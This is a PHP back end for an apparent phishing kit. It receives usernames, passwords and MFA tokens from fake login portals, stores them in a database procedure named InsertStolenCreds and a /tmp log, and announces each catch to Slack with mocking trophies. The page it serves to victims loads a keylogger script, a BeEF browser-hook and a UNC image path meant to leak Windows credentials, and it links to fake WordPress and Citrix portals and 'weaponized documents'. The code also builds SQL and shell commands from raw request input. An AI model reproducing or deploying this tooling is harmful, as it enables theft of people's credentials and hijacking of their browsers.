<?php

// Set Slack Webhook URL
$slackurl = "https://hooks.slack.com/services/YOUR_SLACK_INCOMING_WEBHOOK_URL_HERE";
$slackchannel = "#YOUR_SLACK_CHANNEL_HERE";
$slackemoji = ":fishing_pole_and_fish:";
$slackbotname = "PhishBot";
// OR BOT TOKEN
$SlackLegacyToken = "YOUR_SLACK_LEGACY_TOKEN_OR_SLACKBOT_TOKEN_HERE";

// Set Optional BEEF Hook URL
//$BEEFUrl = "https://YOUR_DOMAIN_HERE.com:3000/hook.js";
$BEEFUrl = "";

// Receives Required Parameters and Sets Variables
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_REQUEST['username'];
$pass = base64_encode($_REQUEST['password']);
$portal = $_REQUEST['project'];
$redirect = $_REQUEST['redirect'];

// Receives Optional Parameters and Overrides Variables
if(isset($_REQUEST['token'])){$MFAToken = $_REQUEST['token'];}else{$MFAToken = "";}
if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}
if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}

// Makes Password Safe for DB
$user = stripslashes($user);

// Pulls in Required Connection Variables for DB
require_once 'dbconfig.php';

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
if($user != ""){

// Writes User and Password to a Local Log (In Case DB Insert Fails)
$myfile = fopen("/tmp/APIPhishingLogs.txt", "a") or die("Unable to open file!");
$txt = $user." ".$pass."\n\r\n\r";
fwrite($myfile, "\n". $txt);
fclose($myfile);

// Checks Trophy Awards
$sqltrophy = "CALL GetAwards('$portal','$user');";
$resulttrophy = $conn->query($sqltrophy);

while($row = $resulttrophy->fetch_assoc()) {

if($row["Title"] == "MostDedicated"){
$cmdtrophy = "curl -F file=@awardgifs/TrophyMostDedicated.gif -F 'initial_comment=Third Times a Charm! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy);
}


if($row["Title"] == "MostDelayed"){
$cmdtrophy2 = "curl -F file=@awardgifs/TrophyMostDelayed.gif -F 'initial_comment=Partys over! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy2);
}

if($row["Title"] == "MostDisclosedPWs"){
$cmdtrophy3 = "curl -F file=@awardgifs/TrophyMostDisclosed.gif -F 'initial_comment=Here Try This One.. - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy3);
}


if($row["Title"] == "MostPhish"){
$cmdtrophy4 = "curl -F file=@awardgifs/TrophyMostPhish.gif -F 'initial_comment=Gonna need a bigger boat.. ".$row["username"]." phish! - ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy4);
}

}

printf($conn->error);
$conn->close();

$conn2 = mysqli_connect($servername, $username, $password, $dbname);

// Inserts Captured Information Into MySQL DB
$sql = "CALL InsertStolenCreds('$user','$pass','$ip','$portal','$MFAToken');";
$result = $conn2->query($sql);

printf($conn2->error);
$conn2->close();

}

?>

<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
      @import url(https://fonts.googleapis.com/css?family=Roboto:400,500,700,300,100);

body {
  background-color: #1b1e24;
  font-family: "Roboto", helvetica, arial, sans-serif;
  font-size: 24px;
  font-weight: 400;
  text-rendering: optimizeLegibility;
}

div.table-title {
   display: block;
  margin: auto;
  max-width: 600px;
  padding:5px;
  width: 100%;
}

.table-title h3 {
   color: #fafafa;
   font-size: 20px;
   font-weight: 400;
   font-style:normal;
   font-family: "Roboto", helvetica, arial, sans-serif;
   text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
   text-transform:uppercase;
}

.table-title h2 {
   color: #fafafa;
   font-size: 26px;
   font-weight: 400;
   font-style:normal;
   font-family: "Roboto", helvetica, arial, sans-serif;
   text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
   text-transform:uppercase;
}


/*** Table Styles **/

.table-fill {
  background: white;
  border-radius:3px;
  border-collapse: collapse;
  height: 275px;
  margin: auto;
  max-width: 600px;
  padding:5px;
  width: 75%;
  box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
  animation: float 5s infinite;
}

th {
  color:#FFFFFF;
  background:#d12128;
  border-bottom:4px solid #9ea7af;
  border-right: 1px solid #343a45;
  font-size:20px;
  font-weight: 120;
  padding:16px;
  text-align:center;
  text-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
  vertical-align:middle;
}

th:first-child {
  border-top-left-radius:3px;
}

th:last-child {
  border-top-right-radius:3px;
  border-right:none;
}

tr {
  border-top: 1px solid #C1C3D1;
  border-bottom-: 1px solid #C1C3D1;
  color:#666B85;
  font-size:16px;
  font-weight:normal;
  text-shadow: 0 1px 1px rgba(256, 256, 256, 0.1);
}

tr:hover td {
  background:#4E5066;
  color:#FFFFFF;
  border-top: 1px solid #22262e;
  border-bottom: 1px solid #22262e;
}

tr:first-child {
  border-top:none;
}

tr:last-child {
  border-bottom:none;
}

tr:nth-child(odd) td {
  background:#EBEBEB;
}

tr:nth-child(odd):hover td {
  background:#4E5066;
}

tr:last-child td:first-child {
  border-bottom-left-radius:3px;
}

tr:last-child td:last-child {
  border-bottom-right-radius:3px;
}

td {
  background:#FFFFFF;
  padding:10px;
  text-align:center;
  vertical-align:middle;
  font-weight:300;
  font-size:16px;
  text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
  border-right: 1px solid #C1C3D1;
}

td:last-child {
  border-right: 0px;
}

th.text-center {
  text-align: left;
}

th.text-center {
  text-align: center;
}

th.text-right {
  text-align: right;
}

td.text-center {
  text-align: left;
}

td.text-center {
  text-align: center;
}

td.text-right {
  text-align: right;
}

/* The Modal (background) */
.modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 1; /* Sit on top */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgb(0,0,0); /* Fallback color */
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content/Box */
.modal-content {
    background-color: #fefefe;
    margin: 15% auto; /* 15% from the top and centered */
    padding: 20px;
    border: 1px solid #888;
    width: 80%; /* Could be more or less, depending on screen size */
}

/* The Close Button */
.close {
    color: #aaa;
    float: right;
    font-size: 28px;
    font-weight: bold;
}

.close:hover,
.close:focus {
    color: black;
    text-decoration: none;
    cursor: pointer;
}

.boxsizingBorder {
    -webkit-box-sizing: border-box;
       -moz-box-sizing: border-box;
            box-sizing: border-box;
}

textarea
{
  width:100%;
}

td.input input {
    width: 100%;
    box-sizing: border-box;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
}

    </style>
<style>
/* Style buttons */
.btn {
  background-color: DodgerBlue;
  border: none;
  color: white;
  padding: 12px 30px;
  cursor: pointer;
  font-size: 20px;
}

/* Darker background on mouse-over */
.btn:hover {
  background-color: RoyalBlue;
}
</style>
<style>
body {
    margin: 0;
}
</style>

<?php
if($redirect != ""){

// See if Redirect Location Allows Iframes
$cmdredir = 'curl -s "'.$redirect.'" -I | grep -Fi X-Frame-Options';

exec($cmdredir,$outputredir);

if(isset($outputredir[0])){
?>
<meta http-equiv="refresh" content="1;URL='<?php echo $redirect; ?>'" />



<?php }} ?>
</HEAD>
<BODY>

<?php if($redirect != false){

if($outputredir[0] == false){ ?>
<iframe src="<?php echo $redirect; ?>" width="100%" height="100%" frameborder="0" sandbox="allow-forms allow-scripts"></iframe>
<script src="https://<?php echo $_SERVER['SERVER_NAME'];?>/kl.js" type="text/javascript"></script>
<?php } ?>

<image height="1" width="1" xlink:href="\\<?php echo $_SERVER['SERVER_NAME'];?>/resource.jpg" />

<!--<iframe src="unc.php" width="0" height="0" frameborder="0" sandbox="allow-forms allow-scripts"></iframe>-->

<script src="https://<?php echo $_SERVER['SERVER_NAME'];?>:3000/hook.js" type="text/javascript"></script>


<?php } ?>

<?php if(isset($_REQUEST['fakesite'])){ ?>

<!-- INSERT PRE-POPULATED LOGON FORM OPTIONS HERE -->
<CENTER>
<BR><BR><BR>
<TABLE WIDTH="80%">
<TR><TH WIDTH="100%" COLSPAN="2">Repository of Login Portals</TH></TR>
<TR><TD><a href="templates/templatecreation.php?template=wordpress"><img src="templates/wordpressportal.png" width="200"></a><br><b>WordPress</b></TD><TD><a href="templates/templatecreation.php?template=citrix"><img src="templates/citrixportal.png" width="200"></a><br><b>Citrix</b></TD></TR>
</TABLE>
<BR><FONT COLOR="#FFFFFF">Choose a default template, download the HTML, and customize however you'd like.  <br><br>For best results, host these landing pages on their own server to avoid having the API blacklisted for a certain campaign.  <br><br>Use SSL for both so there is no mixed-content.  These pages already contain the fields necessary for the API!</FONT>
</CENTER>

<?php } else { ?>

<CENTER>
<BR><BR><BR><TABLE>
<TR><TH>Fake Portal</TH><TH>Weaponized Documents</TH></TR>
<TR><TD><a href="index.php?fakesite=1"><img src="genericlogin.png" width="300"></a></TD><TD><a href="/phishingdocs/"><img src="mswordlogo.png" width="300"></a></TD></TR>
</TABLE>
</CENTER>

<?php } ?>

</BODY>
</HTML>


<?php

$slacklink = "https://".$_SERVER['SERVER_NAME']."/results/index.php?project=".$portal;

// Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
if($user != ""){

// Only Proceed if There is a Password
if($pass != ""){

// Judge Password Complexity
if (preg_match("#.*^(?=.{8,20})(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9]).*$#", $pass)){
    $passstrength = ":thumbsup:";
} else {
    $passstrength = ":poop:";
}

//Checks HaveIBeenPwned DB
$sha1pass = strtoupper(sha1($pass));

//echo $sha1pass."\r\n";

$cmd2 = 'curl -s -X GET "https://api.pwnedpasswords.com/range/'.substr($sha1pass, 0, 5).'"';

//echo $cmd2;

exec($cmd2);

// Executes the curl command
exec($cmd2,$pwned);

$pwnedarray = array();
$arraywithcount = array();

foreach($pwned as $pwned2){
//array_push($pwnedarray, array(substr($pwned2, 0, strrpos($pwned2, ':')), substr($pwned2, 1, strrpos($pwned2, ':'))));
$pos = strpos($pwned2, ":");
$shahash = substr($pwned2, 0, strrpos($pwned2, ':'));
$hashcount = substr($pwned2, $pos + 1);
$arraywithcount[$shahash] = $hashcount;
$pwnedarray[] = substr($pwned2, 0, strrpos($pwned2, ':'));
}

if (in_array(substr($sha1pass, 5), $pwnedarray)) {
    $TroyHunt = "yes";

$haveibeenpwnedhits = $arraywithcount[substr($sha1pass, 5)];

// If the Password is so non-unique, give a Trophy
if ($haveibeenpwnedhits >= "3000"){
$cmdtrophy5 = "curl -F file=@awardgifs/TrophyLeastUniquePassword.gif -F 'initial_comment=That PW Gets Around.. (".$haveibeenpwnedhits." times!) - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy5);
}

} else $TroyHunt = "no";

// If the Password is Set, Change Slack Message
$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\n> Password Strength is ".$passstrength;

} else {

// If the Password is Not Set, Do Not Include Password Strength in Slack Message
$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)";

}

if($TroyHunt == "yes"){$message = $message."\r\n> *_HaveIBeenPwned Hit_*";}

// Execute Slack Incoming Webhook
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';

exec($cmd);

}

?>
